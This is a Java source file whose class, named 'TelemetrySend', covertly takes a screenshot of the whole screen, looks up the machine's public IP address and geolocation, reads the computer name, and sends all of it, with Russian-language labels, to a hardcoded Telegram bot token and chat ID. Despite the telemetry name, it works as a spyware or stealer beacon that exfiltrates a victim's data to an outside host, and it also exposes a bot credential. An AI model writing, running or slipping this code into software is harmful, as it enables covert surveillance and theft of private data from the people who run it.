package Run;

import java.awt.*;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import org.json.JSONObject;


public class TelemetrySend {
    private final String botToken = "8130604600:AAGfXmdOCjI1YfElA70wJHOMwgakIUDAo9Y";
    private final String chatId = "7327220669";

    public static void main(String[] args) {
        TelemetrySend bot = new TelemetrySend();
        bot.sendDataToTelegram();
    }

    public void sendDataToTelegram() {
        try {
            BufferedImage screenshot = takeScreenshot();
            File screenshotFile = new File("screenshot.png");
            ImageIO.write(screenshot, "PNG", screenshotFile);

            String startDate = java.time.LocalDateTime.now().toString();

            String ipAddress = getIpAddress();
            String location = getGeoLocation(ipAddress);

            String computerName = getComputerName();

            String message = String.format(
                    "Дата запуска: %s\nIP адрес: %s\nГеолокация: %s\nНазвание компьютера: %s",
                    startDate, ipAddress, location, computerName
            );


            sendMessage(message);

            sendScreenshot(screenshotFile);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private BufferedImage takeScreenshot() throws AWTException {
        Robot robot = new Robot();
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        return robot.createScreenCapture(screenRect);
    }

    private String getIpAddress() throws IOException {
        URL url = new URL("https://api.ipify.org?format=json");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String inputLine;
        StringBuilder content = new StringBuilder();
        while ((inputLine = in.readLine()) != null) {
            content.append(inputLine);
        }
        in.close();
        JSONObject jsonResponse = new JSONObject(content.toString());
        return jsonResponse.getString("ip");
    }

    private String getGeoLocation(String ipAddress) throws IOException {
        URL url = new URL("http://ip-api.com/json/" + ipAddress);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String inputLine;
        StringBuilder content = new StringBuilder();
        while ((inputLine = in.readLine()) != null) {
            content.append(inputLine);
        }
        in.close();
        JSONObject jsonResponse = new JSONObject(content.toString());
        return jsonResponse.getString("country") + ", " + jsonResponse.getString("regionName") + ", " + jsonResponse.getString("city");
    }

    private String getComputerName() {
        return System.getenv("COMPUTERNAME");
    }

    private void sendMessage(String message) throws IOException {
        String encodedMessage = URLEncoder.encode(message, StandardCharsets.UTF_8.toString());

        String urlString = String.format(
                "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
                botToken, chatId, encodedMessage
        );

        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.getInputStream();
    }

    private void sendScreenshot(File screenshotFile) throws IOException {
        String urlString = String.format(
                "https://api.telegram.org/bot%s/sendPhoto?chat_id=%s",
                botToken, chatId
        );

        HttpURLConnection connection = (HttpURLConnection) new URL(urlString).openConnection();
        connection.setRequestMethod("POST");
        connection.setDoOutput(true);

        String boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

        try (OutputStream output = connection.getOutputStream()) {
            String messagePart = "--" + boundary + "\r\n" +
                    "Content-Disposition: form-data; name=\"photo\"; filename=\"" + screenshotFile.getName() + "\"\r\n" +
                    "Content-Type: image/png\r\n\r\n";
            output.write(messagePart.getBytes());

            byte[] buffer = new byte[4096];
            try (InputStream fileInput = new FileInputStream(screenshotFile)) {
                int bytesRead;
                while ((bytesRead = fileInput.read(buffer)) != -1) {
                    output.write(buffer, 0, bytesRead);
                }
            }

            output.write(("\r\n--" + boundary + "--\r\n").getBytes());
            connection.getInputStream();
        }
    }
}